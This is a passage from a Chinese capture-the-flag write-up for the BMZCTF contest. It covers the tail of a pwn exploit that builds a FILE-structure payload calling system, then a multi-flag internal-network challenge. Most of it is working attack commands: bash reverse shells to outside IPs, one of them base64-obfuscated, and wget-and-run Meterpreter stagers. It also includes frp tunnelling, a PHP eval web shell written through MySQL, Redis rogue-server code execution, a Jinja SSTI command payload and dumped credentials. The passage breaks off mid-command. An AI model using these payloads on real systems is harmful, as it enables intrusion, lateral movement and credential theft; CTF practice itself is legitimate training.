class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">payload += p64((new_size - <span class="number">100</span>) // <span class="number">2</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">payload += p64((new_size - <span class="number">100</span>) // <span class="number">2</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>])</span><br><span class="line">payload += p64(<span class="number">1</span>) + p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(libc_base + <span class="number">0x3ed8c0</span>)</span><br><span class="line">payload += p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>) - <span class="number">1</span>) + p64(<span class="number">0</span>)payload += p64(libc_base + <span class="number">0x3eb8c0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * 6payload += p64(libc_base + <span class="number">0x3e8360</span>) <span class="comment"># _IO_str_jumps</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>])</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>])p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="CFS"><a href="#CFS" class="headerlink" title="CFS"></a>CFS</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p><img src="https://img.shangyexinzhi.com/xztest-image/article/7d22056e2256095b7f8a0cab9a293fc5.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>通过搜索可以发现源码 <a href="https://link.shangyexinzhi.com/url?https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzk0NjEyNjY5OQ%3D%3D%26mid%3D2247486623%26idx%3D1%26sn%3Da9788233c4138c763aa791888fabbcc7%26scene%3D21%23wechat_redirect">https://mp.weixin.qq.com/s/_RXDeXRTLf-hRWEaV2UCiw </a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$shellcode</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shellcode&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$shellcode</span>)||<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">  header(<span class="string">&#x27;HTTP/1.1 400 Bad Request&#x27;</span>);           <span class="comment">//返回Http错误码</span></span><br><span class="line">  <span class="keyword">echo</span> json_encode([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="string">&#x27;false&#x27;</span>]); <span class="comment">//返回错误信息</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// $url = &quot;https://service-5369sd4f-1258472441.sh.apigw.tencentcs.com/bootstrap-2.min.js&quot;;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$name</span>,<span class="variable">$path</span>,<span class="variable">$file_name</span>;</span><br><span class="line">  <span class="variable">$name</span> = md5(time()+<span class="variable">$shellcode</span>+base64_decode(<span class="variable">$shellcode</span>));</span><br><span class="line">  <span class="variable">$file_name</span> = <span class="variable">$name</span>.<span class="string">&quot;.exe&quot;</span>;</span><br><span class="line">  <span class="variable">$file_dir</span> = <span class="string">&quot;./build/&quot;</span>;       <span class="comment">//下载文件存放目录    </span></span><br><span class="line">  <span class="variable">$path</span> = <span class="variable">$file_dir</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$shellcode</span> = sprintf(<span class="string">&quot;python ./Bypass/Input.py %s %s&quot;</span>,<span class="variable">$shellcode</span>,<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">  exec(<span class="variable">$shellcode</span>,<span class="variable">$result</span>);</span><br><span class="line">  <span class="variable">$execResult</span> = <span class="variable">$result</span>[<span class="number">2</span>];</span><br><span class="line">  exec_callback(<span class="variable">$shellcode</span>, <span class="string">&#x27;download&#x27;</span>); </span><br></pre></td></tr></table></figure><p>审计可知存在任意命令执行</p><p>反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/116.62.104.172/6666 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/a2211938f0da2d0174ef43d5ebd70c10.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>得到flag1</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/190a309a7df0a174cc9ef33097eca227.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>上线msf</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 </span><br><span class="line">&gt; use exploit<span class="regexp">/multi/</span>script<span class="regexp">/web_delivery [*] Using configured payload python/m</span>eterpreter<span class="regexp">/reverse_tcpmsf6 exploit(multi/</span>script/web_delivery) </span><br><span class="line">&gt; set lhost <span class="number">81.69</span>.<span class="number">27.32</span>lhost =&gt; <span class="number">81.69</span>.<span class="number">27.32</span>msf6 exploit(multi<span class="regexp">/script/</span>web_delivery) </span><br><span class="line">&gt; set payload linux<span class="regexp">/x64/m</span>eterpreter<span class="regexp">/reverse_tcppayload =&gt; linux/</span>x64<span class="regexp">/meterpreter/</span>reverse_tcpmsf6 exploit(multi<span class="regexp">/script/</span>web_delivery) </span><br><span class="line">&gt; set lport <span class="number">8888</span>lport =&gt; <span class="number">8888</span>msf6 exploit(multi<span class="regexp">/script/</span>web_delivery) </span><br><span class="line">&gt; set target <span class="number">7</span>target =&gt; <span class="number">7</span></span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/60089cbed96b738aa34cf0504d017689.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wget</span> -qO c<span class="number">3</span>hGHQTr --no-check-certificate http://<span class="number">81.69.27.32:8080</span>/<span class="number">3</span>qKxgRC; chmod +x c<span class="number">3</span>hGHQTr; ./c<span class="number">3</span>hGHQTr&amp; disown</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/bfba26a760ee6bdb8ad1913dbe5a7584.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>使用</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">run</span> get_local_subnets</span><br></pre></td></tr></table></figure><p>查看该机器的网段</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/87ec5f40a9d3765c1984499d600fb42e.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>添加路由</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">run</span> autoroute -s <span class="number">172.19.3.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>上传TailorScan进行内网扫描</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload <span class="regexp">/CyzCc/</span>tools<span class="regexp">/TailorScan/</span>TailorScan_linux_amd64 /tmp</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/6e372309031ad7d05a9b0ea6a2ddf093.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/TailorScan_linux_amd64 portscan 172.19.3.0/</span><span class="number">24</span> tcp</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/f617dfafb8f07757492d7edcff554fb1.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>172.19.3.2:80为入口点机器，172.19.3.3:8080为一个cas</p><p>上传frp</p><p>frpc.ini</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">frpc</span>.ini[common]server_addr = <span class="number">81.69.27.32</span>server_port = <span class="number">7000</span>[socks<span class="number">1</span>]type = tcpremote_port = <span class="number">6789</span>plugin = socks<span class="number">5</span></span><br></pre></td></tr></table></figure><p>frps.ini</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[common]<span class="attr">bind_port</span> = <span class="number">7000</span><span class="attr">vhost_http_port</span> = <span class="number">10080</span><span class="attr">vhost_https_port</span> = <span class="number">10443</span><span class="attr">allow_ports</span> = <span class="number">1000</span>-<span class="number">50000</span></span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/4141f8f3e94f896ab726432c81b43e13.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>该版本存在命令执行</p><p>漏洞利用</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/8dcbdc8d9f73ce93142610aee7d64aa8.png?x-oss-process=image/resize,w_670" alt="img"></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTA0LjE3Mi82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>上线msf</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wget</span> -qO c<span class="number">3</span>hGHQTr --no-check-certificate http://<span class="number">81.69.27.32:8080</span>/<span class="number">3</span>qKxgRC; chmod +x c<span class="number">3</span>hGHQTr; ./c<span class="number">3</span>hGHQTr&amp; disown</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/31b7980b3ba4556d52f2a833b46a36f3.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>使用</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">run</span> get_local_subnets</span><br></pre></td></tr></table></figure><p>查看该机器的网段</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/e4cea2d48ccdd6059365734dd1702070.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>上传TailorScan进行内网扫描</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload <span class="regexp">/CyzCc/</span>tools<span class="regexp">/TailorScan/</span>TailorScan_linux_amd64 /tmp</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/509ca3d99bfe5659ce2cd3776bab0a0b.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/TailorScan_linux_amd64 portscan 172.24.6.0/</span><span class="number">24</span> tcp</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/176fd96b156cf2db16247df1b19f1cc1.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>内网存在一个mysql服务，并且也存在80端口，所以可以尝试从cas那台机器读取账号密码进行登陆，尝试写shell </p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">cat /cas-overlay/target/cas/WEB-INF/deployerConfigContext.xml</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dateSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span>  <span class="comment">&lt;!--$</span></span><span class="template-variable">&#123;&#125;</span><span class="xml"><span class="comment">是引入properties文件内容的--&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;org.gjt.mm.mysql.Driver&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://172.28.0.2:3306/cas415&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;cas&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;WHTcasmysql&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;minPoolSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;initialPoolSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span>  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxIdleTime&quot;</span> <span class="attr">value</span>=<span class="string">&quot;20&quot;</span>/&gt;</span>  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>登陆数据库</p><p>将3306转发出来</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">portfwd</span> add -l <span class="number">3308</span> -p <span class="number">3306</span> -r <span class="number">172.24.6.2</span></span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/4d88f6c1447dfa3916135c357aeb1d94.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>简单查看数据库信息可以看到疑似ssh账号密码的内容</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/be7ed0582766760ea57d955e4dcaf202.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh | <span class="type">BMZCTFer_s_p</span>@asswd | <span class="type">BMZCTFer</span></span><br></pre></td></tr></table></figure><p>这里发现可以进行读写文件，由于账号权限为低权限用户，所以udf提权失败，尝试找网站绝对路径进行写shell，访问80端口发现是apache服务</p><p>尝试读取apache配置文件</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">load_file</span>   (<span class="params"><span class="string">&quot;/etc/apache2/sites-enabled/000-default.conf&quot;</span></span>)</span>;</span><br></pre></td></tr></table></figure><p>找到绝对路径</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/10e57fee60632e6f4e910df6cd2cf2d9.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>写马</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">select &quot;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="xml">&quot; into   outfile &quot;/var/www/html/WHT/1.php&quot;;</span></span><br></pre></td></tr></table></figure><p>将80端口转发出来</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">portfwd</span> add -l <span class="number">82</span> -p <span class="number">80</span> -r <span class="number">172.24.6.2</span></span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/b8687cb3d047e8adb3b36f95b8ef7105.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>反弹shell</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/ed0c76d9b48bb2342166ffc73c553961.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>上线msf</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wget</span> -qO c<span class="number">3</span>hGHQTr --no-check-certificate http://<span class="number">81.69.27.32:8080</span>/<span class="number">3</span>qKxgRC; chmod +x c<span class="number">3</span>hGHQTr; ./c<span class="number">3</span>hGHQTr&amp; disown</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/34348def85e2d71006b03d51c2738fde.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>使用</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">run</span> get_local_subnets</span><br></pre></td></tr></table></figure><p>查看该机器的网段</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/f66a24a866877932c18dd93d6adb2856.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>上传TailorScan进行内网扫描</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload <span class="regexp">/CyzCc/</span>tools<span class="regexp">/TailorScan/</span>TailorScan_linux_amd64 /tmp</span><br><span class="line">.<span class="regexp">/TailorScan_linux_amd64 portscan 172.32.8.0/</span><span class="number">24</span> tcp</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/4273dab82e18f9cb945dba1b9a7fdeb8.png?x-oss-process=image/resize,w_670" alt="新知达人, 第二届“BMZCTF”网络安全公开赛官方解题思路"></p><p>存在一个redis</p><p>将6379端口转发出来</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">portfwd</span> add -l <span class="number">6380</span> -p <span class="number">6379</span> -r <span class="number">172.32.8.3</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> redis-master.<span class="keyword">py</span> -r <span class="number">81.69</span>.<span class="number">27.32</span> -<span class="keyword">p</span> <span class="number">6380</span> -L <span class="number">81.69</span>.<span class="number">27.32</span> -<span class="keyword">P</span> <span class="number">1234</span> -<span class="keyword">f</span> RedisModulesSDK/<span class="built_in">exp</span>/<span class="built_in">exp</span>.<span class="keyword">so</span> -<span class="keyword">c</span> <span class="comment">&quot;cat /flag/</span></span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/781b1a75dd3ef24fc52c60e2a50d143c.png" alt="img"></p><p>反弹shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> redis-master.<span class="keyword">py</span> -r <span class="number">81.69</span>.<span class="number">27.32</span> -<span class="keyword">p</span> <span class="number">6380</span> -L <span class="number">81.69</span>.<span class="number">27.32</span> -<span class="keyword">P</span> <span class="number">1234</span> -<span class="keyword">f</span> RedisModulesSDK/<span class="built_in">exp</span>/<span class="built_in">exp</span>.<span class="keyword">so</span> -<span class="keyword">c</span> <span class="string">&#x27;bash -c &quot;bash</span></span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/4699a5792a35dda6f87016990a27433c.png" alt="img"></p><p>上线msf</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;&quot;&quot;f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAASDH/aglYmbYQSInWTTHJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgAiuFFFGyBRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5&lt;gABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB&lt;AAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQ&lt;THJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtI&lt;ipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5&gt; x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g==&gt; &quot;&quot;&quot;</span>| base64 -d &gt; c3hGHQTr</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/33bc7e69c0b8759cde4b2848af1dedcb.png" alt="img"></p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/b888218a3f9de844f8b318253eb9ec53.png" alt="img"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>使用</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">run</span> get_local_subnets</span><br></pre></td></tr></table></figure><p>查看该机器的网段</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/2d4fa61a88fbacb7c1dba407056e19cc.png" alt="img"></p><p>发现redis只有一个网段</p><p>上传TailorScan进行内网扫描</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload /CyzCc/tools/TailorScan/TailorScan_linux_amd64 /tmp</span><br><span class="line">对其进行全端口扫描或者top100</span><br><span class="line">./TailorScan_linux_amd64 portscan <span class="number">172.32.8.0</span>/<span class="number">24 22,3389</span>,<span class="number">3306,1433</span>,<span class="number">21,25,8080</span>,<span class="number">80,81,8081</span>,<span class="number">7001,8000</span>,<span class="number">8088,8888</span>,<span class="number">9090,8090</span>,<span class="number">88,8001,82</span>,<span class="number">9080,8082</span>,<span class="number">8089,9000</span>,<span class="number">8443,9999</span>,<span class="number">8002</span>,<span class="number">89</span>,<span class="number">8083,8200</span>,<span class="number">8008</span>,<span class="number">90</span>,<span class="number">8086,801</span>,<span class="number">8011,8085</span>,<span class="number">9001,9200</span>,<span class="number">8100,8012</span>,<span class="number">85</span>,<span class="number">8084,8070</span>,<span class="number">7002,8091</span>,<span class="number">8003</span>,<span class="number">99</span>,<span class="number">7777,8010</span>,<span class="number">443,8028</span>,<span class="number">8087</span>,<span class="number">83</span>,<span class="number">7003,10000</span>,<span class="number">808,38888</span>,<span class="number">8181,800</span>,<span class="number">18080,8099</span>,<span class="number">8899</span>,<span class="number">86</span>,<span class="number">8360,8300</span>,<span class="number">8800,8180</span>,<span class="number">3505,7000</span>,<span class="number">9002,8053</span>,<span class="number">1000,7080</span>,<span class="number">8989,28017</span>,<span class="number">9060,888</span>,<span class="number">3000,8006</span>,<span class="number">41516,880</span>,<span class="number">8484,6677</span>,<span class="number">8016</span>,<span class="number">84</span>,<span class="number">7200,9085</span>,<span class="number">5555,8280</span>,<span class="number">7005,1980</span>,<span class="number">8161,9091</span>,<span class="number">7890,8060</span>,<span class="number">6080,6379</span>,<span class="number">8880,8020</span>,<span class="number">7070,889</span>,<span class="number">8881,9081</span>,<span class="number">8009,7007</span>,<span class="number">8004,38501</span>,<span class="number">1010</span> tcp</span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/faae66076a3575948e6bfdf1ce5de934.png" alt="img"></p><p>发现172.32.8.2:8000存在一个服务，将其端口转发出来</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">portfwd</span> add -l <span class="number">8001</span> -p <span class="number">8000</span> -r <span class="number">172.32.8.2</span></span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/3d092eff1dfe34508f08ba3f6940185f.png" alt="img"></p><p>随便输入名字，发现存在ssti</p><p>payload</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">http://81.69.27.32:8001/?name=</span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> &#x27;eval&#x27; <span class="keyword">in</span> b.keys() %&#125;</span><span class="xml"> </span><span class="template-variable">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat+/flag/flag5&quot;).read()&#x27;) &#125;&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="xml"> </span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.shangyexinzhi.com/xztest-image/article/dae4b5ed126c5090304f498aaba15aed.png" alt="img"></p><p>反弹shell</p><p><img src="https://img.shangyexinzhi.com/xztest-image/article/c374267d8d7cb7b3b653679154ca63a0.png" alt="img"></p><p>上线msf</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wget</span> -qO c<span class="number">3</span>hGHQTr --no-check-certificate http://<span 